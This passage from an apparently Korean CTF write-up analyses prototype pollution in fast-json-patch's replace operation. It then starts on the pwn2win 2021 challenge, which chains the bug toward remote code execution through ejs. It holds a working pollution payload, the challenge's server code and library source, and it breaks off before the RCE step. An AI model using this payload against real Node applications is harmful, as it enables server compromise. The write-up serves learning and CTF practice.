</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document };
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">remove</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">removed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document, <span style="color:#a6e22e">removed</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">removed</span> };
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">replace</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">removed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document, <span style="color:#a6e22e">removed</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">removed</span> };
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">move</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* in case move target overwrites an existing value,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        return the removed value, this can be taxing performance-wise,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        and is potentially unneeded */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">removed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getValueByPointer</span>(document, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">removed</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">removed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">_deepClone</span>(<span style="color:#a6e22e">removed</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">originalValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">applyOperation</span>(document, { <span style="color:#a6e22e">op</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;remove&#34;</span>, <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">from</span> }).<span style="color:#a6e22e">removed</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">applyOperation</span>(document, { <span style="color:#a6e22e">op</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;add&#34;</span>, <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">originalValue</span> });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document, <span style="color:#a6e22e">removed</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">removed</span> };
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">copy</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">valueToCopy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getValueByPointer</span>(document, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">from</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// enforce copy by value so further operations don&#39;t affect source (see issue #177)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">applyOperation</span>(document, { <span style="color:#a6e22e">op</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;add&#34;</span>, <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">helpers_js_1</span>.<span style="color:#a6e22e">_deepClone</span>(<span style="color:#a6e22e">valueToCopy</span>) });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document };
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document, <span style="color:#a6e22e">test</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">_areEquals</span>(<span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>], <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">value</span>) };
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_get</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document };
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>objOps</code>를 보면 내부에 여러 함수들이 정의되어 있는 것을 볼 수 있다. <code>키:값</code>을 추가, 삭제, 리플레이스, 이동, 복사 등 등을 할 수 있는 것으로 보이고, 무엇을 실행할 지는 <code>objOps</code>에 인자로 넘어온 값을  통해서 판단하고 있다.</p>
<p>우리는 연산자로 <code>replace</code>를 보냈다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#a6e22e">replace</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">key</span>, document) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">removed</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">newDocument</span><span style="color:#f92672">:</span> document, <span style="color:#a6e22e">removed</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">removed</span> };
</span></span><span style="display:flex;"><span>    },
</span></span></code></pre></div><p><code>replace()</code> 메서드를 확인해보면 key의 값을 <code>value</code>를 넣어주고 있는 것을 볼 수 있고, 바로 여기서 <code>Prototype Pollution</code> 취약점이 발생한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">patch</span> <span style="color:#f92672">=</span> [{<span style="color:#a6e22e">op</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;replace&#34;</span>, <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/constructor/prototype/polluted&#34;</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Prototype Pollution&#34;</span>}];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fastjsonpatch</span>.<span style="color:#a6e22e">applyPatch</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">patch</span>);
</span></span></code></pre></div><p>우리는 위처럼 <code>path</code> 값을 전송을 했다. 그러니 내부 오퍼레이션에 의해서 와일문을 돌고, 제일 마지막 번째에서는 마치 <code>a['constructor']['prototype']['polluted']</code>와 같이 작동을 하게 되어 <code>Prototype Pollution</code>이 발생한다.</p>
<hr>
<h1 id="exploit-web-pwn2win-ctf-2021-152-pts">Exploit (Web) pwn2win CTF 2021 [152 pts]<a href="#exploit-web-pwn2win-ctf-2021-152-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>이번 주말에는 <code>pwn2win CTF 2021</code>이라는 대회가 열렸는데 해당 대회에서 웹 문제 중에 솔브가 제일 많은 문제가 <code>Prototype Pollution to RCE in ejs</code>를 이용한 문제였다. 하지만 삽질 실수를 해서 <code>Prototype Pollution</code> 공격을 하지 못 했고, 대회가 끝나고 롸업을 본 후에 <code>npm</code> 공식 사이트를 보니 거의 중간에 답이 있어서 매우 아쉬운 문제다.</p>
<pre tabindex="0"><code>FROM node:alpine

EXPOSE 1337

# copy flag
COPY flag.txt /root/flag.txt

# copy readflag binary (it just reads the flag)
COPY readflag /
RUN chmod 4755 /readflag

# install web application
COPY src /app
RUN cd /app &amp;&amp; npm install

# change to guest user
USER 405

# run application and stay alive for 5 minutes
COPY entrypoint.sh /
ENTRYPOINT /entrypoint.sh
</code></pre><p>도커 파일을 확인해보면 <code>/readflag</code>라는 바이너리 파일을 실행 시키면 될 거 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jsonpatch</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fast-json-patch&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ejs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;ejs&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">basicAuth</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express-basic-auth&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Middlewares //
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>())
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">basicAuth</span>({
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">users</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">SECRET</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;admin&#34;</span> },
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">challenge</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>}))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/////////////////
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">services</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;online&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cameras</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;online&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">doors</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;online&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dome</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;online&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">turrets</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;online&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Static folder
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;/static&#34;</span>, <span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/static&#34;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Homepage
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ejs</span>.<span style="color:#a6e22e">renderFile</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/templates/index.ejs&#34;</span>, {<span style="color:#a6e22e">services</span>})
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">html</span>)
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// API
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/change_status&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">patch</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>).<span style="color:#a6e22e">forEach</span>(([<span style="color:#a6e22e">service</span>, <span style="color:#a6e22e">status</span>]) =&gt; {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">service</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;status&#34;</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Cannot change all services status&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">patch</span>.<span style="color:#a6e22e">push</span>({
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;op&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;replace&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;path&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">service</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;value&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">status</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jsonpatch</span>.<span style="color:#a6e22e">applyPatch</span>(<span style="color:#a6e22e">services</span>, <span style="color:#a6e22e">patch</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;offline&#34;</span> <span style="color:#66d9ef">in</span> Object.<span style="color:#a6e22e">values</span>(<span style="color:#a6e22e">services</span>)){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">services</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;offline&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">services</span>)
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">1337</span>, () =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`App listening at port 1337`</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>서버 측 코드를 확인해보면 <code>/change_status</code>에서 json으로 값을 받아와서 patch 배열에 입력값을 푸쉬한 후에 <code>applyPatch()</code> 메서드에 인자로 넘겨주는 것을 볼 수 있다. 이 뒤로는 위 분석을 통해 충분히 확인하였으니 따로 부연 설명은 생략.</p>
<p>그럼 <code>Prototype Pollution</code>은 성공했지만 RCE를 어떻게 발생시켜야 할 지 확인 해야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Homepage
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ejs</span>.<span style="color:#a6e22e">renderFile</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/templates/index.ejs&#34;</span>, {<span style="color:#a6e22e">services</span>})
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">html</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>index를 보면 ejs의 <code>renderFile()</code> 메서드를 이용해서 템플릿을 반환하는 것을 볼 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">renderFile</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">args</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">slice</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">arguments</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">shift</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cb</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">filename</span>};
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">viewOpts</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Do we have a callback?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">arguments</span>[<span style="color:#a6e22e">arguments</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cb</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">pop</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Do we have data/opts?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">length</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Should always have data obj
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">shift</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Normal passed opts (data obj + opts obj)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">length</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Use shallowCopy so we don&#39;t pollute passed in opts obj with new vals
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">pop</span>());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Special casing for Express (settings + opts-in-data)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Express 3 and 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Pull a few things from known locations
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>.<span style="color:#a6e22e">views</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">views</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>.<span style="color:#a6e22e">views</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>[<span style="color:#e6db74">&#39;view cache&#39;</span>]) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">cache</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Undocumented after Express 2, but still usable, esp. for
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// items that are unsafe to be passed along with data, like `root`
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">viewOpts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>[<span style="color:#e6db74">&#39;view options&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">viewOpts</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">viewOpts</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Express 2 and lower, values set in app.locals, or people who just
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// want to pass options in their data. NOTE: These values will override
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// anything previously set in settings  or settings[&#39;view options&#39;]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopyFromList</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">_OPTS_PASSABLE_WITH_DATA_EXPRESS</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">filename</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">tryHandleCache</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">cb</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>renderFile()</code> 메서드 하단을 보면 <code>tryHandleCache()</code> 메서드를 호출하는 것을 볼 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">tryHandleCache</span>(<span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">cb</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cb</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">promiseImpl</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
